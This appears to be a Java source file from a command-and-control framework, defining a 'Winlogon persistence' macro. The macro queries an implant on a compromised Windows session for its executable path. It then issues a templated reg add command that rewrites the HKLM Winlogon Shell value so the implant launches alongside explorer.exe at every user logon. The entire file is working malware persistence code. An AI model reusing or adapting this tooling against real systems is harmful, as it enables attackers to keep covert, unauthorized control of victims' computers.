package c2.session.macro.persistence;

import c2.Commands;
import c2.WindowsConstants;
import c2.session.macro.AbstractCommandMacro;
import c2.session.macro.MacroOutcome;

public class WinlogonMacro extends AbstractCommandMacro {

	public static final String COMMAND = "winlogon_persist";
	
	public static final String HELP = COMMAND + " - this command will query the target daemon for its executable name, and then amend the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon key. This will start the daemon process the next time any user logs in."; 
	
	public static final String KEY_TEMPLATE = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe, $PUT_EXE_HERE\" /f";
	
	@Override
	public String getReadableName() {
		return "Winlogon Persistence Macro";
	}

	@Override
	public String getInvocationCommandDescription() {
		return HELP;
	}

	@Override
	public String getBehaviorDescription() {
		return "Amendment of the Winlogon registry key will result in Windows starting an instance of the daemon every time a user logs in, in addition to the default shell (explorer.exe).";
	}

	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.equals(COMMAND);
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		
		sendCommand(Commands.CLIENT_CMD_GET_EXE, sessionId, outcome);
		String clientCmd = awaitResponse(sessionId, outcome);
		clientCmd = clientCmd.replace("\r", "");
		clientCmd = clientCmd.replace("\n", "");
		String cmdForKey = clientCmd;
		String formatedRegCommand = KEY_TEMPLATE.replace("$PUT_EXE_HERE", cmdForKey);
		sendCommand(formatedRegCommand, sessionId, outcome);
		String response = awaitResponse(sessionId, outcome);
		if(!response.contains(WindowsConstants.WINDOWS_SYSTEM_COMMAND_COMPLETE_MSG)) {
			outcome.addError("Unable to modify registry key, insufficient permissions.");
		}else {
			outcome.addMacroMessage("Success!");
		}
		
		return outcome;
	}

}
